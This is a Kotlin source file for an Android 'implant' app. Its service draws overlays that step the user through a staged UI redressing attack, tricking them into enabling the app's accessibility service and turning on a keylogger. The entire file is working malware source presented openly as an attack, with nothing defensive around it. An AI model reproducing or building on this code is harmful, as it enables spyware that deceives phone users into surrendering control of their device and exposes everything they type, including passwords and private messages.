/*
* Android Service that draws an overlay over the system contents.
* This will be used to launch a UI redressing attack to trick the user into enabling our
* AccessibilityService and activating our KeyLogger.
* */
package com.cooperthecoder.implant

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log


class OverlayService : Service() {

    private lateinit var attack: RedressingAttack

    companion object {
        @JvmStatic
        private val TAG: String = javaClass.name
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        val listener = {
            Log.d(TAG, "Stage completed")
            // Go to the home screen if there are no more stages
            if (!attack.moveToNext()) {
                attack.stopAttack()
                stopSelf()
                val intent = Intent(Intent.ACTION_MAIN)
                intent.addCategory(Intent.CATEGORY_HOME)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
            }
        }
        val stages = ArrayList<Stage>()
        stages.add(AccessibilityStage(this, listener))
        stages.add(ToggleSwitchStage(this, listener))
        attack = RedressingAttack(stages)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        attack.moveToNext()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        attack.stopAttack()
    }

}

